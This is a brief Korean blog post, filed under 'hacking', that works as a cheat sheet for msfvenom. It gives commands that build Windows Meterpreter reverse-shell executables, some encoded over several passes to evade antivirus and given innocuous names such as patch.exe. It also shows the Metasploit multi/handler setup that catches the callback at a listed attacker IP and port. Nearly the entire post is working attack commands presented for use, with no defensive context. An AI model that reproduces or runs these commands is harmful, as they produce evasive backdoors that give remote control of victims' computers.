---
emoji: 🔧
title: msfvenom 사용법
date: '2025-04-01 12:00:00'
author: 양원준
tags: 블로그 github-pages gatsby
categories: hacking
---

## 📌 msfvenom 사용법
```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe lhost=192.168.123.112 lport=4444 -o /root/test.exe

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe -o payload.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=(공격자ip) lport=(default=4444) -f exe -e x64/zutto_dekiru -i 3 -o /root/patch.exe

```
> -p : 페이로드 옵션을 설정    
 -o : 파일 경로와 파일명 지정    
 -e : 인코딩     
 -f : 파일 형식
 -a : 아키텍쳐     
 --platform : 플랫폼 설정\
 -i : 인코딩 횟수

```
msfconsle
use multi/handler
set payload windows/meterpreter/reverse_tcp or windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.123.112
set LPORT 4444

exploit -j
```
- - -

```toc
```